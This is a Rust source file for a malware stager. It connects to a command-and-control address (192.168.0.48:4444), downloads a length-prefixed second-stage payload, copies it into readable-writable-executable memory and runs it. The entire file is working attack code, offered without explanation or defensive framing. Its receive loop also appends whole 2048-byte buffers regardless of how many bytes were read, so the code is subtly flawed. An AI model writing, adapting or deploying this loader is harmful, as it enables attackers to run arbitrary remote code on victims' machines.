extern crate mmap;
extern crate byteorder;

use std::io::prelude::*;
use std::net::TcpStream;
use std::{mem, ptr};
use byteorder::{LittleEndian, ReadBytesExt};
use mmap::*;

fn exec_shellcode(shellcode: &mut [u8]) {
    let opts = [
        MapOption::MapReadable,
        MapOption::MapWritable,
        MapOption::MapExecutable
    ];

    let mapping = MemoryMap::new(shellcode.len(), &opts).unwrap();

    unsafe {
        ptr::copy(shellcode.as_ptr(), mapping.data(), shellcode.len());
        mem::transmute::<_, fn()>(mapping.data())();
    }
}

fn get_stage2(connect_string: &str) -> Vec<u8>{
    // Connect to C2
    let mut stream = TcpStream::connect(connect_string).unwrap();
    // Declare some variables
    let mut stage2_len: [u8;4] = [0;4];
    let mut total_read: usize = 0;
    let mut stage2_vec = Vec::new();
    // Read stage2 length from wire
    stream.read(&mut stage2_len).unwrap();
    let mut buf = &stage2_len[..];
    let size = buf.read_u32::<LittleEndian>().unwrap();
    // Read stage2 bytes from wire
    while total_read < size as usize {
        let mut buf: [u8;2048] = [0;2048];
        total_read += stream.read(&mut buf).unwrap();
        stage2_vec.extend_from_slice(&buf);
    }
    return stage2_vec;
}

fn main() {
    let mut stage2 = get_stage2("192.168.0.48:4444");
    exec_shellcode(&mut stage2[..]);
}
